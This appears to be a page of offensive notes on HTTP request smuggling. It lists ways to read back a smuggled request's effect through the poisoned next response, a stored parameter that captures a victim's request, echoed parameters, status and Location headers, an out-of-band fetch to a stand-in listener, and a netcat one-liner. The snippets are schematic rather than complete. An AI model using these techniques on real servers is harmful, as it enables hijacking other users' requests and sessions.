# Desync readback — the self-poison's channel

## The self-poison — `POST [desync] + GET /`

```text
POST / [desync: GET /marker] → GET / → the GET returns /marker
```

The self-poison — your next request's response IS the smuggle's —
`response-poisoning.md`.

## The self-poison's timing — the queue's order

```text
POST / [desync] → GET / → the back-end answers the smuggle →
your GET's response is the smuggle's
```

The queue's FIFO — the smuggle's response goes to the next slot —
`queue-management.md`.

## The stored readback — `POST /store` + `GET /store/last`

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

`session-hijack.md` — the victim's request inside `x=`.

## The echoed-param — `GET /search?q=X`

```text
GET /search?q=MARKER HTTP/1.1
```

`smuggle-readback.md` — the echo.

## The status readback — the smuggle's status

```text
GET /admin HTTP/1.1
```

smuggled → the next response's status is `/admin`'s — `smuggle-readback.md`.

## The Location readback — the smuggle's `Location:`

```text
GET /redirect?to=/marker HTTP/1.1
```

smuggled → the `Location: /marker` lands — `smuggle-readback.md`.

## The OOB readback — the smuggle's URL-fetch

```text
GET /?url=http://oob.t/m HTTP/1.1
```

smuggled → `oob_listener` captures it — `blind-smuggle.md`.

## The deferred readback — the async job

```text
store the smuggle → the job runs → the job's log
```

`webhook-deferred.md`.

## The socket-accounting — the response-count

```bash
printf 'POST / [desync] GET / HTTP/1.1\r\n\r\n' | nc t 80
```

`detection-oracle.md`.
